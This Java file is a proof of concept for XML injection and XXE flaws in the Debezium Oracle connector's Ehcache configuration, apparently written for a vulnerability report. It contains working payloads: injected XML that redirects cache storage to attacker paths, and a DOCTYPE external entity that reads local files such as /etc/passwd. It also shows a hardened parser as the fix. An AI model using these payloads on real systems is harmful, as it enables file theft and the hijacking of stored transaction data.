package io.debezium.connector.oracle;

import java.io.PrintStream;
import java.io.StringReader;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import io.debezium.connector.oracle.logminer.buffered.ehcache.EhcacheCacheProvider;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
import org.xml.sax.ErrorHandler;
import org.xml.sax.InputSource;
import org.xml.sax.SAXParseException;

/**
 * Proof of Concept: XML Injection + XXE in Debezium Oracle Connector
 *
 * <pre>
 * Vulnerability : XML Injection (CWE-91) + XML External Entity Injection (CWE-611)
 * Component     : debezium-connector-oracle
 * Affected file : logminer/buffered/ehcache/EhcacheCacheProvider.java
 * Attack surface: Kafka Connect connector configuration properties (user-controlled)
 * CVSS 3.1      : 9.0 Critical (PR:H)  AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
 *                 9.9 Critical (PR:L)  AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
 *                 10.0 Critical (PR:N) AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (default: no auth)
 * </pre>
 *
 * <h3>Root Cause</h3>
 * <ol>
 *   <li>{@code getConfigurationWithSubstitutions()} inserts 6 connector config values
 *       verbatim into an XML template via {@code String.replace()} - no escaping,
 *       no validation - allowing injection of arbitrary XML nodes (CWE-91).</li>
 *   <li>{@code createCacheManager()} parses the resulting XML with
 *       {@code DocumentBuilderFactory.newInstance()}.  When Oracle XML JARs
 *       ({@code xdb.jar}, {@code xmlparserv2.jar}) are on the classpath, the JVM
 *       service-loader resolves this to Oracle's {@code JXDocumentBuilderFactory},
 *       which rejects the Apache-specific {@code disallow-doctype-decl} feature,
 *       making standard XXE hardening impossible (CWE-611).</li>
 * </ol>
 *
 * <h3>Usage</h3>
 * <pre>
 *   # default target (edit DEFAULT_TARGET constant below)
 *   java XmlInjectionDemo
 *
 *   # custom target - pass file path as first argument
 *   java XmlInjectionDemo /etc/passwd                              # Linux
 *   java XmlInjectionDemo C:/Windows/System32/drivers/etc/hosts   # Windows
 * </pre>
 */
public class XmlInjectionDemo {

    // Configuration
    /**
     * Default file to exfiltrate via XXE when no CLI argument is supplied.
     * Uses forward slashes - required by the file:/// URI scheme on all platforms.
     */
    private static final String DEFAULT_TARGET = "C:/Users/caoba/Downloads/debezium/flag/flag.txt";

    /**
     * Reproduction of the Ehcache XML template loaded at runtime from
     * {@code ehcache/configuration-template.xml}.
     * Two of the six {@code ${...}} placeholders used in production are shown here
     * (simplified for demo clarity); the real template in
     * {@code ehcache/configuration-template.xml} contains all six injection points.
     * All six are replaced verbatim in {@code EhcacheCacheProvider.getConfigurationWithSubstitutions()}.
     */
    private static final String EHCACHE_TEMPLATE =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            + "<config xmlns='http://www.ehcache.org/v3'>"
            +   "<default-serializers>"
            +     "<serializer type=\"java.lang.String\">"
            +       "org.ehcache.impl.serialization.StringSerializer"
            +     "</serializer>"
            +   "</default-serializers>"
            +   "${log.mining.buffer.ehcache.global.config}"        // injection point 1
            +   "<cache alias=\"transactions\">"
            +     "<key-type>java.lang.String</key-type>"
            +     "<value-type>java.lang.String</value-type>"
            +     "${log.mining.buffer.ehcache.transactions.config}" // injection point 2
            +   "</cache>"
            + "</config>";

    // Entry point
    public static void main(String[] args) throws Exception {
        String targetPath = args.length > 0 ? args[0] : DEFAULT_TARGET;
        // Normalise Windows back-slashes to forward slashes for the file URI
        String fileUri = "file:///" + targetPath.replace("\\", "/");

        printBanner();
        demo1_XmlInjectionGlobalConfig();
        demo2_XmlInjectionTransactionsConfig();
        demo3_XxeFileRead(targetPath, fileUri);
        printSummary(targetPath);
    }

    // Demo 1 - XML Injection via log.mining.buffer.ehcache.global.config
    /**
     * Demonstrates CWE-91 via the {@code global.config} connector property.
     *
     * <p>An attacker sets:
     * <pre>
     *   log.mining.buffer.ehcache.global.config =
     *       &lt;persistence directory='/attacker/path' /&gt;
     * </pre>
     * The value is concatenated into the XML template without escaping
     * ({@code EhcacheCacheProvider.java:139}), causing Ehcache to persist
     * its data to an attacker-controlled directory.
     */
    static void demo1_XmlInjectionGlobalConfig() throws Exception {
        section("VULN-1: XML Injection via global.config  [EhcacheCacheProvider.java:139]");

        // Malicious value supplied as a Kafka Connect connector property
        String maliciousPropertyValue = "<persistence directory='/tmp/attacker-data' />";

        String injectedXml = EHCACHE_TEMPLATE
                .replace("${log.mining.buffer.ehcache.global.config}", maliciousPropertyValue)
                .replace("${log.mining.buffer.ehcache.transactions.config}", "");

        info("Attacker sets connector property:");
        info("  log.mining.buffer.ehcache.global.config = " + maliciousPropertyValue);

        // Parse with the same unsecured factory used in production
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(true);
        Document doc = factory.newDocumentBuilder()
                .parse(new InputSource(new StringReader(injectedXml)));

        NodeList persistenceNodes =
                doc.getElementsByTagNameNS("http://www.ehcache.org/v3", "persistence");

        if (persistenceNodes.getLength() > 0) {
            String dir = persistenceNodes.item(0)
                    .getAttributes().getNamedItem("directory").getNodeValue();
            success("Injected <persistence directory='" + dir + "'/> accepted by Ehcache");
            warn("Ehcache will persist data to attacker-controlled path: " + dir);
        }
        else {
            fail("Injection did not reach the parser");
        }
    }

    // Demo 2 - XML Injection via log.mining.buffer.ehcache.transactions.config
    /**
     * Demonstrates CWE-91 via the {@code transactions.config} connector property.
     *
     * <p>An attacker overrides the transactions cache resource configuration,
     * redirecting Ehcache's on-disk storage of Oracle CDC transaction data to an
     * arbitrary path they control ({@code EhcacheCacheProvider.java:141}).
     */
    static void demo2_XmlInjectionTransactionsConfig() throws Exception {
        section("VULN-2: XML Injection via transactions.config  [EhcacheCacheProvider.java:141]");

        String maliciousPropertyValue =
                "<resources>"
                + "<heap unit=\"entries\">1000</heap>"
                + "<disk path='/tmp/stolen-oracle-txn' unit='MB'>500</disk>"
                + "</resources>";

        String injectedXml = EHCACHE_TEMPLATE
                .replace("${log.mining.buffer.ehcache.global.config}", "")
                .replace("${log.mining.buffer.ehcache.transactions.config}",
                        maliciousPropertyValue);

        info("Attacker sets connector property:");
        info("  log.mining.buffer.ehcache.transactions.config = " + maliciousPropertyValue);

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(true);
        Document doc = factory.newDocumentBuilder()
                .parse(new InputSource(new StringReader(injectedXml)));

        NodeList diskNodes =
                doc.getElementsByTagNameNS("http://www.ehcache.org/v3", "disk");

        if (diskNodes.getLength() > 0) {
            String path = diskNodes.item(0)
                    .getAttributes().getNamedItem("path").getNodeValue();
            success("Injected <disk path='" + path + "'/> accepted by Ehcache");
            warn("All Oracle CDC transaction data will be written to: " + path);
        }
        else {
            fail("Injection did not reach the parser");
        }
    }

    // Demo 3 - XXE File Read via Oracle's JXDocumentBuilderFactory
    /**
     * Demonstrates CWE-611 using the same parser instantiation as production.
     *
     * <p>Three sub-steps:
     * <ol>
     *   <li><b>3a</b> - Show that the default factory is Oracle's
     *       {@code JXDocumentBuilderFactory} and that it resolves external
     *       entities, enabling arbitrary file read.</li>
     *   <li><b>3b</b> - Show that Oracle's factory rejects the Apache security
     *       feature {@code disallow-doctype-decl}, so the vulnerability cannot
     *       be mitigated with the standard approach while Oracle JARs are present.</li>
     *   <li><b>3c</b> - Show the correct fix: explicitly requesting the JDK
     *       built-in {@code DocumentBuilderFactoryImpl} and enabling all XXE
     *       protection features.</li>
     * </ol>
     *
     * @param targetPath human-readable path shown in output
     * @param fileUri    RFC-8089 file URI used in the DOCTYPE SYSTEM identifier
     */
    static void demo3_XxeFileRead(String targetPath, String fileUri) throws Exception {
        section("VULN-3: XXE File Read  [EhcacheCacheProvider.java:115]");

        // DOCTYPE payload referencing the target file via an external entity
        String xxePayload =
                "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE config [ <!ENTITY xxe SYSTEM \"" + fileUri + "\"> ]>"
                + "<config xmlns='http://www.ehcache.org/v3'>&xxe;</config>";

        // 3a: Vulnerable path (production behaviour)
        System.out.println();
        System.out.println("  [3a] Vulnerable - oracle.xml.jaxp.JXDocumentBuilderFactory"
                + " (production default when Oracle JARs are on the classpath)");
        info("Target : " + targetPath);
        info("URI    : " + fileUri);

        DocumentBuilderFactory oracleFactory = DocumentBuilderFactory.newInstance();
        info("Factory: " + oracleFactory.getClass().getName());
        oracleFactory.setNamespaceAware(true);

        try {
            Document doc = oracleFactory.newDocumentBuilder()
                    .parse(new InputSource(new StringReader(xxePayload)));
            String exfiltrated = doc.getDocumentElement().getTextContent().trim();

            if (!exfiltrated.isEmpty()) {
                success("XXE file read succeeded - exfiltrated content:");
                printBox(exfiltrated);
            }
            else {
                warn("Parser accepted DOCTYPE but returned empty content "
                        + "(file may be empty or binary)");
            }
        }
        catch (Exception e) {
            warn("Parser attempted to read the file but failed: " + e.getMessage());
            info("On a Linux host with /etc/passwd this would succeed.");
        }

        //3b: Demonstrate that Oracle's parser cannot be hardened
        System.out.println();
        System.out.println("  [3b] Hardening attempt on Oracle parser");

        DocumentBuilderFactory oracleFactory2 = DocumentBuilderFactory.newInstance();
        try {
            oracleFactory2.setFeature(
                    "http://apache.org/xml/features/disallow-doctype-decl", true);
            warn("Oracle parser unexpectedly accepted the security feature");
        }
        catch (javax.xml.parsers.ParserConfigurationException e) {
            // Expected: Oracle's JXDocumentBuilderFactory does not implement
            // Apache Xerces-specific features, so standard XXE hardening fails.
            fail("Oracle parser rejected Apache security feature ["
                    + e.getClass().getSimpleName() + "]");
            warn("Standard XXE mitigation is INEFFECTIVE while Oracle JARs are on the classpath.");
        }

        // 3c: Correct fix - force JDK built-in parser
        System.out.println();
        System.out.println("  [3c] Fixed - com.sun.org.apache.xerces (JDK built-in, explicitly requested)");

        // Bypass the service-loader by naming the JDK implementation directly.
        // This ensures the factory is always Xerces regardless of what Oracle JARs
        // register, and allows all standard XXE security features to be applied.
        DocumentBuilderFactory jdkFactory = DocumentBuilderFactory.newInstance(
                "com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl",
                EhcacheCacheProvider.class.getClassLoader());

        jdkFactory.setFeature(
                "http://apache.org/xml/features/disallow-doctype-decl", true);
        jdkFactory.setFeature(
                "http://xml.org/sax/features/external-general-entities", false);
        jdkFactory.setFeature(
                "http://xml.org/sax/features/external-parameter-entities", false);
        jdkFactory.setExpandEntityReferences(false);
        jdkFactory.setNamespaceAware(true);

        info("Factory: " + jdkFactory.getClass().getName());

        try {
            // Suppress the [Fatal Error] stderr line that the JDK parser prints
            // before throwing - keeps PoC output clean for reporting purposes.
            PrintStream originalErr = System.err;
            System.setErr(new PrintStream(PrintStream.nullOutputStream()));
            try {
                DocumentBuilder safeBuilder = jdkFactory.newDocumentBuilder();
                safeBuilder.setErrorHandler(SILENT_ERROR_HANDLER);
                safeBuilder.parse(new InputSource(new StringReader(xxePayload)));
            }
            finally {
                System.setErr(originalErr);
            }
            fail("JDK parser accepted DOCTYPE - this should never happen");
        }
        catch (Exception e) {
            success("JDK parser blocked DOCTYPE immediately - XXE prevented  [FIXED]");
        }
    }

    // Summary
    static void printSummary(String targetPath) {
        System.out.println();
        line('=', 66);
        System.out.println("  CVE REPORT SUMMARY");
        line('=', 66);
        System.out.printf("  %-19s %s%n", "Component:",  "Debezium Oracle Connector");
        System.out.printf("  %-19s %s%n", "Version:",    "3.6.0-SNAPSHOT (main, 2026-05-20)");
        System.out.printf("  %-19s %s%n", "File:",       "EhcacheCacheProvider.java");
        System.out.printf("  %-19s %s%n", "Type:",       "XML Injection + XXE (CWE-91, CWE-611)");
        System.out.printf("  %-19s %s%n", "Vector:",     "Kafka Connect connector config properties");
        System.out.printf("  %-19s %s%n", "Auth:",       "Low privilege (Kafka Connect user)");
        System.out.printf("  %-19s %s%n", "Impact:",     "Arbitrary file read, data exfiltration, path hijack");
        System.out.printf("  %-19s %s%n", "CVSS 3.1:",   "9.0 Critical (PR:H)  AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H");
        System.out.printf("  %-19s %s%n", "",            "9.9 Critical (PR:L)  AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H");
        System.out.printf("  %-19s %s%n", "",            "10.0 Critical (PR:N) AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (default)");
        System.out.printf("  %-19s %s%n", "XXE target:", targetPath);
        line('-', 66);
        System.out.println("  ROOT CAUSE");
        System.out.println("  1. String.replace() on user input -> raw XML injection (lines 139-150)");
        System.out.println("  2. DocumentBuilderFactory.newInstance() -> Oracle JXDocumentBuilderFactory");
        System.out.println("     -> Apache security features unsupported -> XXE unfixable (line 115)");
        line('-', 66);
        System.out.println("  RECOMMENDED FIX  (EhcacheCacheProvider.java line 115)");
        System.out.println("  DocumentBuilderFactory.newInstance(");
        System.out.println("    \"com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl\",");
        System.out.println("    EhcacheCacheProvider.class.getClassLoader())");
        System.out.println("  + setFeature(\"disallow-doctype-decl\", true)");
        System.out.println("  + setFeature(\"external-general-entities\", false)");
        System.out.println("  + setFeature(\"external-parameter-entities\", false)");
        System.out.println("  + setExpandEntityReferences(false)");
        line('=', 66);
    }

    // Constants
    /**
     * No-op ErrorHandler - prevents the JDK parser from printing
     * "[Fatal Error]" directly to stderr before re-throwing the exception.
     */
    private static final ErrorHandler SILENT_ERROR_HANDLER = new ErrorHandler() {
        @Override public void warning(SAXParseException e) {}
        @Override public void error(SAXParseException e) {}
        @Override public void fatalError(SAXParseException e) {}
    };

    // Helpers
    static void printBanner() {
        line('=', 66);
        System.out.println("  PoC  |  Debezium Oracle Connector - XML Injection + XXE");
        System.out.println("  File |  EhcacheCacheProvider.java");
        line('=', 66);
    }

    static void printBox(String content) {
        line('-', 52);
        for (String row : content.split("\n")) {
            System.out.printf("  | %-48s|%n",
                    row.length() > 48 ? row.substring(0, 48) : row);
        }
        line('-', 52);
    }

    static void section(String title) {
        System.out.println("\n[DEMO] " + title);
        line('-', Math.min(title.length() + 7, 66));
    }

    static void line(char ch, int len) {
        System.out.println("  " + String.valueOf(ch).repeat(len));
    }

    static void success(String msg) { System.out.println("  [+] " + msg); }
    static void fail(String msg)    { System.out.println("  [-] " + msg); }
    static void warn(String msg)    { System.out.println("  [!] " + msg); }
    static void info(String msg)    { System.out.println("      " + msg); }
}
